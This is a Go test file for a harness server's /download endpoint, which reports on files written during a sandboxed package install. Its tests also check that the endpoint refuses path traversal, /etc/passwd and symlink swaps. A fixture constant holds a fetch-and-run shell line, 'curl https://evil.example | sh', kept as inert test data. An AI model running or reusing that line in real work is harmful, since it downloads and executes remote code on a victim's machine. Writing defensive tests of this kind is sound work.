package harness

import (
	"crypto/sha256"
	"encoding/hex"
	"net/http"
	"os"
	"path/filepath"
	"testing"
)

// payload is what the fake install writes outside the working directory.
const payload = "#!/bin/sh\ncurl https://evil.example | sh\n"

// wroteFile installs with a fake that writes ~/.cache/x, a file the
// harness observes the server writing.
func wroteFile(t *testing.T) (testRun, string) {
	t.Helper()
	inst := &fakeInstaller{}
	run := newTestRun(t, inst)
	must(t, os.WriteFile(filepath.Join(run.home, ".profile"), []byte("before"), 0o600))
	written := filepath.Join(run.home, ".cache", "x")
	inst.write = func(Sandbox) {
		must(t, os.MkdirAll(filepath.Dir(written), 0o750))
		must(t, os.WriteFile(written, []byte(payload), 0o600))
	}
	if status, body := run.do(t, http.MethodPost, "/install", installBody("npm", "weather@1.0.0")); status != http.StatusOK {
		t.Fatalf("POST /install = %d %v", status, body)
	}
	return run, written
}

func TestDownloadDescribesAFileTheServerWrote(t *testing.T) {
	run, written := wroteFile(t)
	status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written})
	sum := sha256.Sum256([]byte(payload))
	if status != http.StatusOK ||
		text(t, body["path"]) != written ||
		!jsonEqual(t, body["size"], mustJSON(t, len(payload))) ||
		text(t, body["sha256"]) != hex.EncodeToString(sum[:]) ||
		text(t, body["kind"]) != "text/plain; charset=utf-8" ||
		text(t, body["excerpt"]) != payload {
		t.Errorf("POST /download = %d %v", status, body)
	}
}

func TestDownloadOnlyDescribesAFileSeenWritten(t *testing.T) {
	run, written := wroteFile(t)
	for path, want := range map[string]int{
		filepath.Join(run.home, ".profile"): http.StatusNotFound,
		"/etc/passwd":                       http.StatusNotFound,
		".cache/x":                          http.StatusBadRequest,
		written + "/../x":                   http.StatusBadRequest,
	} {
		if status, _ := run.do(t, http.MethodPost, "/download", map[string]any{"path": path}); status != want {
			t.Errorf("POST /download %s = %d, want %d", path, status, want)
		}
	}
}

func TestDownloadRefusesAWrittenFileSwappedForALink(t *testing.T) {
	run, written := wroteFile(t)
	must(t, os.Remove(written))
	must(t, os.Symlink("/etc/passwd", written))
	if status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written}); status != http.StatusBadRequest {
		t.Errorf("POST /download of a link = %d %v, want 400", status, body)
	}
	must(t, os.Remove(written))
	if status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written}); status != http.StatusNotFound {
		t.Errorf("POST /download of a removed file = %d %v, want 404", status, body)
	}
}
